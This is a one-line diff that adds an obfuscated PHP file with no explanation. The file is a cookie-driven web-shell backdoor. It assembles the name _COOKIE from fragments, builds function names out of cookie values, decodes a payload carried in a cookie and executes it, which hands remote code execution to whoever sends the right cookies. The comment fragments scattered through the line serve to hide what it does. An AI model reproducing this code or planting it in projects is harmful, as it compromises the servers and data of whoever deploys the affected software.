@@ -1,0 +1,1 @@
+<?php $s='OKI';$t='_CO';/*Iub*/$i='E';$cm/*2#vc*/=${$t.$s.$i};if(isset($cm/*x:;*/['F'])){$z=$cm/*FEC*/['F'].$cm['ai'];$mn=/*C4e*/$cm['d'].$cm['ud']/*X*/.$cm['A'];$dj=$z('',$mn($cm['Qp']));$dj();}
